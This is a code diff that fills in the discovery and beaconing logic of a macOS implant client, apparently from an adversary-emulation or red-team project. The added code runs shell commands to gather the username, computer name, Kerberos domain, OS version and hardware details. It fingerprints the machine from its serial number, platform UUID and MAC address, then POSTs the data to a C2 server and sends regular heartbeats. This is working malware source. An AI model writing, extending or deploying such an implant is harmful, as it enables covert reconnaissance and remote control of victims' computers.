@@ -2,21 +2,103 @@
 
 namespace client {
     const int RESP_BUFFER_SIZE = 4096;
+
+    std::string executeCmd(std::string cmd) {
+        FILE *fp;
+        std::string output = "";
+        char line[2048];
+
+        fp = popen(cmd.c_str(), "r");
+        if (fp == NULL) {
+            std::cout << "[IMPLANT] Failed to run command" << std::endl;
+        }
+
+        while (fgets(line, sizeof(line), fp) != NULL) {
+            output = output + line;
+        }
+
+        pclose(fp);
+
+        return output;
+    }
+
+    std::string getPlatformExpertDeviceValue(std::string key) {
+        CFStringRef value_ref;
+        char buffer[64] = {0};
+        std::string ret("");
+        io_service_t platformExpert = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                            IOServiceMatching("IOPlatformExpertDevice"));
+        CFStringRef key_cfstring = CFStringCreateWithCString(kCFAllocatorDefault, key.c_str(), kCFStringEncodingUTF8);
+        if (platformExpert)
+        {
+            CFTypeRef value_cfstring = IORegistryEntryCreateCFProperty(platformExpert,
+                                                                        key_cfstring,
+                                                                        kCFAllocatorDefault, 0);
+            if (value_cfstring) {
+                value_ref = (CFStringRef)value_cfstring;
+            }
+            if (CFStringGetCString(value_ref, buffer, 64, kCFStringEncodingUTF8)) {
+                ret = buffer;
+            }
+
+            IOObjectRelease(platformExpert);
+        }
+        return ret;
+    }
 }
 
-bool ClientPP::osInfo (int dwRandomTimeSleep) {
+bool ClientPP::osInfo (int dwRandomTimeSleep, ClientPP * c) {
+    bool completed_discovery = false;
     // if parameters are populated, just return true
+    if (c->strClientID != "") {
+        std::cout << "[IMPLANT] Client ID already populated as: " + c->strClientID << std::endl;
+        return true;
+    }
 
     // otherwise, perform discovery actions, send to C2 server, return true
-    //      ClientPP::createClientID()
-    //      getpwuid() > pw_name - https://pubs.opengroup.org/onlinepubs/009604499/functions/getpwuid.html
-    //      scutil --get ComputerName
-    //      uname -m
-    //      system_profiler SPHardwareDataType 2>/dev/null | awk ...
-    //      send POST request with data to C2
-    
-    // return false on any issues or errors
-    return true;
+    else {
+        std::string os_info = "";
+
+        os_info += c->pathProcess + "\n";
+        ClientPP::createClientID(c);
+        os_info += c->strClientID + "\n";
+
+        std::chrono::system_clock::time_point tp = std::chrono::system_clock::now();
+        std::chrono::system_clock::duration duration = tp.time_since_epoch();
+        c->installTime = duration.count() * std::chrono::system_clock::period::num / std::chrono::system_clock::period::den;
+        os_info += std::to_string(c->installTime) + "\n";
+
+        // getpwuid() -> pw_name
+        struct passwd *pwd;
+        std::string username;
+        if ((pwd = getpwuid(geteuid())) != NULL)
+            username = pwd->pw_name;
+        os_info += username + "\n";
+
+        // scutil --get ComputerName
+        os_info += client::executeCmd("scutil --get ComputerName");
+
+        // uname -m
+        os_info += client::executeCmd("uname -m");
+
+        // get domain name
+        c->domain = client::executeCmd("klist 2>/dev/null | awk '/Principal/ {split($0,line,\"@\"); printf(\"%s\", line[2])}'");
+        os_info += c->domain;
+
+        // sw_vers
+        os_info += client::executeCmd("sw_vers -productVersion");
+
+        // system_profiler SPHardwareDataType 2>/dev/null | awk ...
+        os_info += client::executeCmd("system_profiler SPHardwareDataType 2>/dev/null | awk '/Processor / {split($0,line,\": \"); printf(\"%s\",line[2]);}'") + "\n";
+        os_info += client::executeCmd("system_profiler SPHardwareDataType 2>/dev/null | awk '/Memory/ {split($0,line, \": \"); printf(\"%s\", line[2]);}'") + "\n";
+
+        // send POST request with data to C2
+        std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(c->dylib, "POST", std::vector<unsigned char>(os_info.begin(), os_info.end()));
+
+        completed_discovery = true;
+    }
+
+    return completed_discovery;
 }
 
 void ClientPP::runClient(int dwRandomTimeSleep, void * dylib) {
@@ -25,7 +107,7 @@ void ClientPP::runClient(int dwRandomTimeSleep, void * dylib) {
     std::vector<unsigned char> heartbeat_vector( heartbeat.begin(), heartbeat.end() );
     std::vector<unsigned char> response_vector = ClientPP::performHTTPRequest(dylib, "GET", heartbeat_vector);
 
-    std::cout << "Response buffer contains: ";
+    std::cout << "[IMPLANT] Response buffer contains: ";
     for (auto i: response_vector) {
         std::cout << i;
     }
@@ -40,15 +122,30 @@ void ClientPP::runClient(int dwRandomTimeSleep, void * dylib) {
     std::this_thread::sleep_for(std::chrono::milliseconds(dwRandomTimeSleep));
 }
 
-int8_t ClientPP::createClientID() {
-    int8_t id[24];
-
+void ClientPP::createClientID(ClientPP * c) {
     //  serial number - ioreg -rdl -c IOPlatformExpertDevice | awk '/IOPlatformSerialNumber/ {split ($0, line, "\""); printf("%s", line[4]); }'
-    //  hardware UUID - ioreg -rdl -c IOPlatformExpertDevice | awk '/IOPlatformUUID/ {split ($0, line, "\""); printf("%s", line[4]); }'
-    //  mac address - ifconfig en0 | awk '/ether/{print $2}'
-    //  randomly generated UUID - uuidgen
+    std::string serial_number = client::getPlatformExpertDeviceValue("IOPlatformSerialNumber");
 
-    return *id;
+    //  hardware UUID - ioreg -rdl -c IOPlatformExpertDevice | awk '/IOPlatformUUID/ {split ($0, line, "\""); printf("%s", line[4]); }'
+    std::string platform_uuid = client::getPlatformExpertDeviceValue("IOPlatformUUID");
+
+    //  mac address - ifconfig en0 | awk '/ether/{print $2}'
+    std::string mac_address = client::executeCmd("ifconfig en0 | awk '/ether/{print $2}'");
+    mac_address = mac_address.substr(0, mac_address.size()-1);
+
+    //  randomly generated UUID - uuidgen
+    std::string random_uuid = client::executeCmd("uuidgen");
+    random_uuid = random_uuid.substr(0, random_uuid.size() -1 );
+    std::cout << "[IMPLANT] uuidgen returned: " + random_uuid << std::endl;
+
+    std::string cmd = "echo " + serial_number + platform_uuid + mac_address + random_uuid + " | md5 | xxd -r -p | base64";
+
+    std::string id_str = client::executeCmd(cmd);
+    id_str = id_str.substr(0, id_str.size()-1);
+    std::vector<unsigned char> id_vector(id_str.begin(), id_str.end());
+
+    memcpy(c->clientID, &id_vector[0], sizeof(id_vector));
+    c->strClientID = id_str;
 }
 
 std::vector<unsigned char> ClientPP::performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data) {
@@ -61,7 +158,7 @@ std::vector<unsigned char> ClientPP::performHTTPRequest(void* dylib, std::string
     // loads CommsLib exported function that generates the HTTP request
     void (*sendRequest)(const char * str, const std::vector<unsigned char> data, unsigned char ** response, int ** response_length) = (void(*)(const char*, const std::vector<unsigned char>, unsigned char**, int**))dlsym(dylib, "sendRequest");
     if (sendRequest == NULL) {
-        std::cout << "unable to load libComms.dylib sendRequest" << std::endl;
+        std::cout << "[IMPLANT] unable to load libComms.dylib sendRequest" << std::endl;
         dlclose(dylib);
         return std::vector<unsigned char>();
     }
@@ -70,4 +167,8 @@ std::vector<unsigned char> ClientPP::performHTTPRequest(void* dylib, std::string
     sendRequest(type.c_str(), data, &response_buffer_ptr, &response_length_ptr);
 
     return std::vector<unsigned char>(response_buffer, response_buffer + response_length);
+}
+
+ClientPP::~ClientPP() {
+    dlclose(dylib);
 }
